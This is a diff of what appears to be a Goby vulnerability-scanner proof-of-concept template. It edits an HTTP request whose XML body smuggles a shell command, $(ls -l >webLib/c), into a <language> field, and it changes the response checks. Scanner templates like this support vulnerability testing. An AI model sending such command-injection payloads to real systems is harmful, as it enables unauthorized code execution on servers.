@@ -59,7 +59,7 @@
                               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                         },
                         "data_type": "text",
-                        "data": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<language>$(>webLib/c)</language>",
+                        "data": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<language>$(ls -l >webLib/c)</language>",
                         "set_variable": []
                   },
                   "ResponseTest": {
@@ -70,14 +70,7 @@
                                     "type": "item",
                                     "variable": "$code",
                                     "operation": "==",
-                                    "value": "200",
-                                    "bz": ""
-                              },
-                              {
-                                    "type": "item",
-                                    "variable": "$body",
-                                    "operation": "contains",
-                                    "value": "test",
+                                    "value": "500",
                                     "bz": ""
                               }
                         ]
@@ -110,10 +103,10 @@
                         ]
                   },
                   "SetVariable": [
-                        "output|lastbody|regex|"
+                        "output|lastbody||"
                   ]
             }
       ],
-      "PostTime": "2021-11-16 15:10:23",
+      "PostTime": "2021-11-17 13:28:08",
       "GobyVersion": "1.8.302"
 }
